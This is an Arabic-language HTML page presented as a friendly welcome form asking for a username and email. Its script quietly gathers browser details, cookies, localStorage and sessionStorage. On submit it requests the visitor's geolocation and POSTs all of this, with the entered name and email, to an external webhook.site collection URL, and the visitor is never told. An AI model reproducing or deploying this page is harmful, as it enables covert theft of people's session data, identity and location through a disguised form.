<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إرسال بيانات إلى Webhook</title>
</head>
<body>
    <h1>مرحبًا بك في عالم Power!</h1>
    <p>نحن سعداء بوجودك هنا. استمتع بتجربتك معنا!</p>

    <!-- نموذج لإدخال بيانات العميل -->
    <form id="userForm">
        <label for="username">اسم المستخدم:</label>
        <input type="text" id="username" name="username" required><br><br>

        <label for="email">البريد الإلكتروني:</label>
        <input type="email" id="email" name="email" required><br><br>

        <button type="submit">إرسال البيانات</button>
    </form>

    <script>
        // === استخراج بيانات حقيقية من المتصفح ===
        const userAgent = navigator.userAgent;
        const language = navigator.language || navigator.userLanguage;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const platform = navigator.platform;
        const sessionStart = new Date().toISOString();

        // === تخزين في الكوكيز ===
        document.cookie = `userAgent=${encodeURIComponent(userAgent)}; path=/`;
        document.cookie = `lang=${language}; path=/`;

        // === تخزين في localStorage ===
        localStorage.setItem('timezone', timezone);
        localStorage.setItem('platform', platform);
        localStorage.setItem('userAgent', userAgent);

        // === تخزين في sessionStorage ===
        sessionStorage.setItem('sessionStart', sessionStart);
        sessionStorage.setItem('language', language);

        // === إرسال البيانات عند تقديم النموذج ===
        document.getElementById('userForm').addEventListener('submit', function(event) {
            event.preventDefault();

            // الحصول على بيانات العميل من النموذج
            const username = document.getElementById('username').value;
            const email = document.getElementById('email').value;

            // === إرسال بيانات الموقع الجغرافي وبيانات العميل إلى Webhook ===
            navigator.geolocation.getCurrentPosition(function(position) {
                fetch("https://webhook.site/0d8243d9-5449-4c2c-91c1-02c3820c31b6", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        cookies: document.cookie,
                        sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
                        localStorage: Object.fromEntries(Object.entries(localStorage)),
                        userAgent: userAgent,
                        username: username,  // اسم المستخدم الذي أدخله العميل
                        email: email,        // البريد الإلكتروني الذي أدخله العميل
                        time: new Date().toISOString(),
                        location: {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        }
                    })
                })
                .then(response => response.json())
                .then(data => console.log("تم إرسال البيانات بنجاح:", data))
                .catch(error => console.log("حدث خطأ أثناء إرسال البيانات:", error));
            }, function(error) {
                console.log("حدث خطأ في الحصول على الموقع الجغرافي: ", error);
            });

            // إظهار رسالة بعد إرسال البيانات
            alert("تم إرسال البيانات بنجاح!");
        });

    </script>
</body>
</html>
